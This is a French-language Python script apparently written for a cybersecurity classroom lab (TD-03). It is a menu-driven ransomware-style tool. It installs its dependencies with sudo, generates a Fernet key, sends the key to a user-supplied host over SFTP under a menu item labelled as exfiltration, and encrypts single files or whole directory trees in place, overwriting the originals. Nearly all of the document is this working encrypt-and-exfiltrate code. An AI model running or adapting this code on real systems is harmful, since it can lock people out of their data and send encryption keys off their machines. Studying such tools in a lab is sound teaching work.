import os
import sys
import subprocess
import getpass
import time

# --- PARTIE A : Vérification et Auto-réparation du Système ---
def check_dependencies():
    """Vérifie Python 3.8+, installe pip si absent, puis les libs."""
    if sys.version_info < (3, 8):
        sys.exit("[!] Erreur : Python 3.8 ou supérieur est requis.")

    # 1. Vérification/Installation de PIP et des libs via APT sur Linux
    if os.name != 'nt':  # Si on est sur Linux
        try:
            # On vérifie si les modules sont déjà là pour gagner du temps
            import cryptography
            import paramiko
            import tqdm
        except ImportError:
            print("[*] Environnement Linux vierge détecté. Initialisation du système...")
            try:
                # Tentative d'installation des paquets système pour éviter les erreurs PIP
                subprocess.check_call(["sudo", "apt", "update"], stdout=subprocess.DEVNULL)
                subprocess.check_call([
                    "sudo", "apt", "install", 
                    "python3-pip", "python3-cryptography", "python3-paramiko", "python3-tqdm", "-y"
                ])
                print("[+] Système prêt. Relancement...")
                os.execv(sys.executable, [sys.executable] + sys.argv)
            except Exception as e:
                print(f"[!] Erreur lors de l'initialisation APT : {e}")
                print("[*] Tentative de secours via PIP...")

    # 2. Vérification secondaire via PIP (pour Windows ou si APT a échoué)
    libs = {'cryptography': 'cryptography', 'paramiko': 'paramiko', 'tqdm': 'tqdm'}
    for lib_name, import_name in libs.items():
        try:
            __import__(import_name)
        except ImportError:
            print(f"[*] Installation de {lib_name} via PIP...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", "--break-system-packages", lib_name])
            except Exception:
                print(f"[!] PIP non trouvé. Installez python3-pip manuellement.")
                sys.exit(1)
            
    print("[+] Toutes les dépendances sont opérationnelles.")

# Lancement de la vérification système
check_dependencies()

# Imports sécurisés
from cryptography.fernet import Fernet
import paramiko
from tqdm import tqdm

# --- PARTIE C : Gestion des Clés ---
def generate_key_logic():
    print("\n--- [PARTIE C] GÉNÉRATION DE CLÉ ---")
    print("1. AES (Standard Fernet)")
    print("2. PBKDF2 (Dérivation de clé)")
    algo = input("Algorithme (1/2) : ")
    
    bits = input("Longueur de clé (128, 192, 256) : ")
    key = Fernet.generate_key()
    
    # Chemin selon l'OS (exigence /var/keys/)
    path = "/var/keys/" if os.name != 'nt' else "./keys/"
    try:
        if not os.path.exists(path):
            os.makedirs(path, exist_ok=True)
        
        full_path = os.path.join(path, "lab_key.key")
        with open(full_path, "wb") as f:
            f.write(key)
        
        if os.name != 'nt':
            os.chmod(full_path, 0o600) # Permissions restreintes
            
        print(f"[+] Clé générée et sécurisée dans {full_path}")
        return key, full_path
    except PermissionError:
        print("[!] Erreur : Droits insuffisants. Relancez avec sudo pour /var/keys/")
        return None, None

# --- PARTIE D : Transfert SFTP ---
def transfer_sftp(local_file):
    print("\n--- [PARTIE D] TRANSFERT SFTP ---")
    host = input("IP de ton ordinateur : ")
    user = input("Login SSH : ")
    pwd = getpass.getpass("Password SSH (invisible) : ")
    dest = input("Destination sur ton PC (ex: C:/Users/Nom/key.key ou /tmp/key) : ")

    try:
        transport = paramiko.Transport((host, 22))
        transport.connect(username=user, password=pwd)
        sftp = paramiko.SFTPClient.from_transport(transport)
        sftp.put(local_file, dest)
        sftp.close()
        transport.close()
        print(f"[+] Transfert réussi vers {host}")
    except Exception as e:
        print(f"[!] Échec du transfert : {e}")

# --- PARTIE E & F : Chiffrement In-Place ---
def encrypt_action(key):
    print("\n--- [PARTIE E/F] CHIFFREMENT ---")
    print("1. Un seul fichier")
    print("2. Répertoire complet (Récursif)")
    mode = input("Choix : ")
    
    targets = []
    path = input("Entrez le chemin (Fichier ou Dossier) : ")
    
    if mode == "1" and os.path.isfile(path):
        targets.append(path)
    elif mode == "2" and os.path.isdir(path):
        for root, _, files in os.walk(path):
            for f in files:
                if f not in ["main.py", "lab_key.key"]:
                    targets.append(os.path.join(root, f))
    
    if not targets:
        print("[!] Aucun fichier trouvé.")
        return

    cipher = Fernet(key)
    print(f"[*] Chiffrement de {len(targets)} fichiers...")
    for item in tqdm(targets, desc="Traitement"):
        try:
            with open(item, "rb") as f: data = f.read()
            # Chiffrement In-Place
            with open(item, "wb") as f: f.write(cipher.encrypt(data))
            time.sleep(0.02)
        except Exception as e:
            print(f"\n[!] Erreur sur {item} : {e}")

# --- PARTIE B : Menu Principal ---
def main():
    current_key = None
    key_path = None
    
    while True:
        print("\n" + "═"*30)
        print("   LAB CYBER TD-03 : MENU")
        print("═"*30)
        print("1. [Partie C] Générer une clé")
        print("2. [Partie D] Exfiltrer via SFTP")
        print("3. [Partie E/F] Lancer le chiffrement")
        print("4. Quitter le programme")
        
        choice = input("\nAction : ")
        
        if choice == "1":
            current_key, key_path = generate_key_logic()
        elif choice == "2":
            if key_path: transfer_sftp(key_path)
            else: print("[!] Générez d'abord une clé.")
        elif choice == "3":
            if current_key: encrypt_action(current_key)
            else: print("[!] Générez d'abord une clé.")
        elif choice == "4":
            print("[*] Fermeture du lab.")
            break
        else:
            print("[!] Option invalide.")

if __name__ == "__main__":
    main()